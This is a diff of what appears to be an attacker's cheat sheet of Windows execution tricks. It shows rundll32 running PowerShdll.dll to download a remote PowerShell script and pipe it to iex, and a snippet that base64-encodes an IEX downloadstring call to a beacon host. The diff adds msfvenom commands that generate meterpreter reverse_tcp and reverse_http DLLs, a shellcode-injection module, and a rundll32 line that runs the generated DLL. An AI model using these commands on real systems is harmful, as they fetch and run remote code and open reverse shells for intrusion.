@@ -21,13 +21,18 @@ rundll32 PowerShdll.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| i
 rundll32 Powershdll.dll,main [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("BASE64")) ^| iex
 ----
 rundll32.exe PowerShdll.dll,main
-
+msfvenom -p windows/meterpreter/reverse_tcp lhost=eth0 lport=8080 -f dll > test.dll 
+windows/manage/shellcode_inject
 ----
 ENCODE
 $str = "IEX ((new-object net.webclient).downloadstring('http://10.8.0.6:80/http-beacon'))"
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 --------------------------------------------------------------------------------
 https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml
+--------------------------------------------------------------------------------------
+rundll32 test.dll,main
+msfvenom -p windows/meterpreter/reverse_http lhost=eth0 lport=8080 -f dll > test.dll
+
 
 
 -------------------------------------------------------------------------------------------
